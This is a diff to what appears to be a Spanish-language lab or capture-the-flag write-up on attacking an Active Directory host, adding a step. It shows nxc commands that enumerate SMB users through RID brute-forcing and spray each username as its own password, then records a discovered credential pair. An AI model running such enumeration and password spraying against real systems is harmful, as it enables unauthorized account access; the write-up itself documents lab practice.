@@ -44,3 +44,16 @@ Users
 nxc smb 10.114.135.170 -u guest -p '' --rid-brute | grep "SidTypeUser" | awk '{print $6}' | cut -d '\' -f2-2 | tee users.txt
 ```
 
+
+Probamos a hace run ataque de User as Password
+
+```shell
+nxc smb 10.114.135.170 -u users.txt -p users.txt --no-bruteforce --continue-on-succes
+```
+
+Encontramos un usuario que utiliza el mismo usuario como contraseña
+
+```ad-hint
+ybob317::ybob317
+```
+
